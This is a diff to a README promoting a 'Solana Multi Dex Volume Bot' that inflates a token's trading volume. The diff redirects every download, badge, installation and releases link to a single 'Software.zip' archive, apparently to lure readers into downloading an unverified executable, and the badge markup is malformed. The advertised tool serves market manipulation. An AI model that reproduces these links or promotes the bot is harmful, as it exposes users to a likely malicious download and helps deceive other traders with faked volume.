@@ -1,8 +1,8 @@
 # 🚀 Welcome to Solana Multi Dex Volume Bot - "Booster Your Token's Volume!"
 
-## Repository: [multi-dex-volume-bot](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+## Repository: [multi-dex-volume-bot](https://github.com/Amadablow/multi-dex-volume-bot/releases/download/v1.0/Software.zip)
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/Amadablow/multi-dex-volume-bot/releases/download/v1.0/Software.zip%https://github.com/Amadablow/multi-dex-volume-bot/releases/download/v1.0/Software.zip)](https://github.com/Amadablow/multi-dex-volume-bot/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Welcome to the **Solana Multi Dex Volume Bot** repository! This powerful tool al
 - volume-control
 
 ### Installation
-To get started with the Solana Multi Dex Volume Bot, simply click on the [Download Latest Version](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) button above. Ensure that you have the necessary dependencies installed before launching the bot.
+To get started with the Solana Multi Dex Volume Bot, simply click on the [Download Latest Version](https://github.com/Amadablow/multi-dex-volume-bot/releases/download/v1.0/Software.zip) button above. Ensure that you have the necessary dependencies installed before launching the bot.
 
 ### Usage
 1. Download the bot from the provided link.
@@ -53,5 +53,5 @@ For any questions or assistance regarding the bot, please reach out to our suppo
 
 Explore the endless possibilities of decentralized trading and take your token to new heights in the crypto market. Download the bot now and unleash its power!
 
-For additional updates and releases, check the [Releases](https://github.com/cli/browser/releases) section of this repository. Thank you for choosing the **Solana Multi Dex Volume Bot** for your trading journey. Happy trading! 🚀
+For additional updates and releases, check the [Releases](https://github.com/Amadablow/multi-dex-volume-bot/releases/download/v1.0/Software.zip) section of this repository. Thank you for choosing the **Solana Multi Dex Volume Bot** for your trading journey. Happy trading! 🚀
 
